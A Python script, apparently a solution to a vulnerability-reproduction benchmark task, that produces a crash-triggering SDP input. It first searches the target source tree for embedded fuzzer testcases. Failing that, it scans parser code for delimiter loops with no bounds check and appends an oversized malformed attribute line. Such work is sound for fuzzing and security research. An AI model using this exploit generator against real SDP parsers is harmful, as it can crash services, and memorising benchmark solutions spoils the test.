import os
import re
import tarfile
import gzip
from typing import Iterator, Tuple, Optional, List


class Solution:
    _ATTR_CANDIDATES = [
        "candidate",
        "fmtp",
        "rtpmap",
        "fingerprint",
        "setup",
        "mid",
        "msid",
        "ice-ufrag",
        "ice-pwd",
        "ssrc",
        "ssrc-group",
        "group",
        "extmap",
        "rid",
        "simulcast",
        "rtcp-fb",
        "sctp-port",
        "max-message-size",
        "ice-options",
        "end-of-candidates",
    ]

    def solve(self, src_path: str) -> bytes:
        poc = self._find_embedded_poc(src_path)
        if poc is not None:
            return poc

        inferred = self._infer_trigger_attribute_and_delim(src_path)
        if inferred is None:
            attr = "candidate"
            delim = " "
        else:
            attr, delim = inferred

        attr = attr.strip().strip(":").strip()
        if not attr:
            attr = "candidate"

        bad_value = self._make_bad_value_avoiding_delim(delim, 256)

        # Minimal SDP scaffolding; keep malformed attribute as last line without trailing newline.
        lines = [
            b"v=0",
            b"o=- 0 0 IN IP4 0.0.0.0",
            b"s=-",
            b"t=0 0",
            b"m=audio 9 UDP/TLS/RTP/SAVPF 0",
        ]
        sdp = b"\r\n".join(lines) + b"\r\n" + (b"a=" + attr.encode("utf-8", "ignore") + b":" + bad_value)
        return sdp

    def _make_bad_value_avoiding_delim(self, delim: str, n: int) -> bytes:
        if not delim or delim == "\x00":
            return b"A" * n
        d = delim.encode("latin1", "ignore")[:1]
        if not d:
            return b"A" * n
        base = b"A" * n
        if d in base:
            base = base.replace(d, b"B")
        return base

    def _is_tar(self, p: str) -> bool:
        if os.path.isdir(p):
            return False
        lower = p.lower()
        return lower.endswith((".tar", ".tar.gz", ".tgz", ".tar.bz2", ".tbz2", ".tar.xz", ".txz"))

    def _iter_files(self, src_path: str) -> Iterator[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    fp = os.path.join(root, fn)
                    try:
                        st = os.stat(fp)
                    except OSError:
                        continue
                    if not os.path.isfile(fp):
                        continue
                    if st.st_size > 25 * 1024 * 1024:
                        continue
                    try:
                        with open(fp, "rb") as f:
                            yield fp, f.read()
                    except OSError:
                        continue
        elif self._is_tar(src_path):
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        if m.size > 25 * 1024 * 1024:
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                        except Exception:
                            continue
                        yield m.name, data
            except Exception:
                return
        else:
            try:
                with open(src_path, "rb") as f:
                    yield src_path, f.read()
            except OSError:
                return

    def _looks_like_sdp(self, data: bytes) -> bool:
        if not data:
            return False
        if b"\x00" in data[:256]:
            return False
        head = data[:4096].lower()
        if b"v=" in head and (b"o=" in head or b"s=" in head) and (b"t=" in head or b"m=" in head):
            return True
        if b"\na=" in head or b"\r\na=" in head:
            # attribute-heavy inputs can be short
            if b"m=" in head or b"v=" in head:
                return True
        return False

    def _maybe_gunzip(self, data: bytes) -> Optional[bytes]:
        if len(data) >= 2 and data[0] == 0x1F and data[1] == 0x8B:
            try:
                out = gzip.decompress(data)
                return out
            except Exception:
                return None
        return None

    def _find_embedded_poc(self, src_path: str) -> Optional[bytes]:
        keyword_hi = [
            "clusterfuzz-testcase-minimized",
            "clusterfuzz-testcase",
            "oss-fuzz",
            "repro",
            "poc",
            "crash",
            "regression",
            "testcase",
            "376100377",
        ]

        best_data = None
        best_score = -1
        best_len = 1 << 60

        for name, data in self._iter_files(src_path):
            lname = name.replace("\\", "/").lower()
            if len(data) == 0 or len(data) > 200_000:
                continue

            score = 0
            for k in keyword_hi:
                if k in lname:
                    score += 50
            if "/fuzz" in lname or "fuzz" in lname:
                score += 10
            if "/test" in lname or "test" in lname:
                score += 5
            if lname.endswith((".sdp", ".txt", ".input", ".bin", ".dat", ".raw")):
                score += 5
            if "sdp" in lname:
                score += 10

            if score == 0:
                continue

            cand = data
            gzd = self._maybe_gunzip(data)
            if gzd is not None and self._looks_like_sdp(gzd):
                cand = gzd
                score += 10

            if self._looks_like_sdp(cand):
                score += 30

            clen = len(cand)
            if score > best_score or (score == best_score and clen < best_len):
                best_score = score
                best_len = clen
                best_data = cand

        if best_data is not None and best_score >= 60:
            return best_data
        return None

    def _infer_trigger_attribute_and_delim(self, src_path: str) -> Optional[Tuple[str, str]]:
        # Heuristic: find suspicious loops in SDP parser sources that scan for a delimiter without bounds check,
        # then pick nearby attribute string.
        suspicious = []

        while_ptr_re = re.compile(r"while\s*\(\s*\*\s*([A-Za-z_]\w*)\s*!=\s*'([^']{1})'")
        while_idx_re = re.compile(r"while\s*\(\s*([A-Za-z_]\w*)\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]\s*!=\s*'([^']{1})'")
        attr_lit_re = re.compile(
            r'"(' + "|".join(re.escape(a) for a in sorted(self._ATTR_CANDIDATES, key=len, reverse=True)) + r')(?::)?"',
            re.IGNORECASE,
        )
        parse_name_re = re.compile(r"\b(Parse|parse)_?([A-Za-z0-9_]+)\b")

        def path_score(p: str) -> int:
            lp = p.replace("\\", "/").lower()
            sc = 0
            if "parser" in lp:
                sc += 10
            if "sdp" in lp:
                sc += 20
            if "/core/" in lp or "core" in lp:
                sc += 5
            if lp.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inl", ".rs", ".go", ".java")):
                sc += 3
            return sc

        for name, data in self._iter_files(src_path):
            if len(data) > 2_000_000:
                continue
            ps = path_score(name)
            if ps < 15:
                continue

            try:
                txt = data.decode("utf-8", "ignore")
            except Exception:
                continue
            if "sdp" not in txt.lower() and "parser" not in txt.lower():
                continue

            lines = txt.splitlines()
            for i, line in enumerate(lines):
                l = line.strip()
                if "while" not in l and "for" not in l:
                    continue

                m = while_ptr_re.search(l)
                delim = None
                if m:
                    delim = m.group(2)
                    if any(x in l for x in ("end", "size", "length", "<", "<=", "!=")) and ("*"+m.group(1)) in l and ("end" in l or "size" in l or "length" in l):
                        # has some bounds mention; less likely
                        pass
                else:
                    m2 = while_idx_re.search(l)
                    if m2:
                        delim = m2.group(3)

                if not delim:
                    continue

                cond = l
                if "end" in cond or "size" in cond or "length" in cond:
                    # still could be vulnerable, but deprioritize
                    bounds_penalty = 5
                else:
                    bounds_penalty = 0

                w0 = max(0, i - 50)
                w1 = min(len(lines), i + 50)
                ctx = "\n".join(lines[w0:w1])

                attr_m = attr_lit_re.search(ctx)
                attr = attr_m.group(1) if attr_m else ""

                pn = ""
                for pm in reversed(list(parse_name_re.finditer(ctx))):
                    pn = pm.group(2)
                    if pn:
                        break

                if not attr and pn:
                    attr = self._camel_to_attr(pn)

                local = ps
                if attr_m:
                    local += 50
                if "value" in ctx.lower() and ("end" in ctx.lower() or "len" in ctx.lower() or "length" in ctx.lower()):
                    local += 8
                local -= bounds_penalty

                suspicious.append((local, attr, delim))

        if not suspicious:
            return None

        suspicious.sort(key=lambda x: (-x[0], len(x[1]) if x[1] else 9999))
        best = suspicious[0]
        attr = best[1] if best[1] else "candidate"
        delim = best[2] if best[2] else " "
        return attr.lower(), delim

    def _camel_to_attr(self, s: str) -> str:
        s = s.strip()
        s = re.sub(r"Attribute$", "", s, flags=re.IGNORECASE)
        s = re.sub(r"Parser$", "", s, flags=re.IGNORECASE)
        s = s.replace("_", "-")
        # Split camelcase reasonably; keep acronyms intact
        s = re.sub(r"([a-z0-9])([A-Z])", r"\1-\2", s)
        s = re.sub(r"([A-Z]+)([A-Z][a-z])", r"\1-\2", s)
        s = s.lower()
        # Try to match known attrs by containment
        for a in self._ATTR_CANDIDATES:
            if a in s:
                return a
        return s[:40] if s else "candidate"